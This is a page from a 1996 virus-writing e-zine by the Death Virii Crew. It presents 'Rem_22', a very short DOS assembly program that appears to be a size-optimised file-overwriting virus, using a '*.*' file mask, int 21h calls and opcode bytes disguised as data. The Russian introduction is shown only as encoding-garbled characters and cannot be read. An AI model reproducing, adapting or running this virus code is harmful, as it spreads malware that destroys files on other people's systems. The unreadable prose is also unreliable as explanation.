comment {

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


				Rem_22

 ��� �����쪨� ����ࠩ�� �� ����ᠭ ��� ���㡭� ���ﭨ�� ����� 
ᯮ஢ � ������� �४�஬ � 堪�஬ SkullC0DEr'��. ���� �� �먣࠭
����, ��� ���⮩�� �।�⠢�⥫�� ᢮��� 㢫�祭�� - ��ଥ�����⢠.
��� ��। ���� � ���� �襭�� ������让 �஡����, ������� ��﫠:

{
.model tiny
.code
.startup
start:
pop cx
hel:
xchg ax,bx
db 108h shr 1
db 4eh	; dec si
db 9eh 	shr 1
db 3ch	;cmp al,xx
db 100h shr 1
db 40h
fmask db '*.*',0
lodsw
cwd
mov dl,al
shl dx,1
int 21h
jmp hel
end


						(c) by Reminder [DVC]
